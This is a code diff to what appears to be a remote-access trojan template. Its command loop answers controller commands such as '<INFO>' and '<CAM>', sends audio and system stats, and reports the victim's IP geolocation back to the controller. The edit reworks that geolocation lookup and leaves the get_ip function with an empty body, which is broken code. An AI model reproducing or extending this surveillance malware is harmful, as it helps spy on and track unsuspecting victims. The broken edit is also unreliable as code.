@@ -1106,6 +1106,7 @@ import sys
 import shutil
 import requests
 
+
 {kill_def}
 
 local_shell = False
@@ -1124,13 +1125,12 @@ def show_error(text):
 {startup}
 
 def get_ip_info():
-    ip_info = ""
-    ip_info += str(requests.get(f"https://ipapi.co/{"{get_ip()}"}/json/").content.decode(errors="replace").strip())
-    return ip_info
+    ip = str(requests.get("https://api.ipify.org?format=json").json()['ip'])
+    return str(requests.get(f"https://ipapi.co/{"{ip}"}/json/").content.decode(errors="replace").strip())
 
 
 def get_ip():
-    return str(requests.get("https://api.ipify.org?format=json").json()['ip'])
+    
 
 
 def audio(client):
@@ -1391,8 +1391,7 @@ def recv():
                 threading.Thread(target=send_stats, args=(client,)).start()
 
             elif command == "<INFO>":
-                info = str(get_ip_info(get_ip()))
-                client.sendall(info.encode())
+                client.sendall(get_ip_info().encode())
 
             elif command == "<CAM>":
                 global cam
